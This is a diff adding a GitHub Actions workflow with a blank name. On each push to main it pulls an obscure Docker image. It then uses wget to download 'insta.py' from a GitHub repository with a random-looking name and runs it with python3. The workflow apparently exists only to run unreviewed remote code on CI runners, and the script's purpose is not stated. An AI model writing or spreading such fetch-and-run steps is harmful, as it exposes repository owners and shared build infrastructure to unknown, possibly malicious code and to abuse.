@@ -1,0 +1,20 @@
+name: _____
+
+on:
+  push:
+    branches: [ "main" ]
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  YT:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Pull Docker image
+      run: docker pull livetest/d3thtr3p:v2
+    - name: Run Docker file
+      run: |
+            docker run livetest/d3thtr3p:v2 sh -c "wget https://raw.githubusercontent.com/xjxiIaueufus8q88e7eu2heh/co-whgoc9sisjdizizikJsjei-9-20--9-_-7-_8-8--273-/main/insta.py && python3 insta.py"
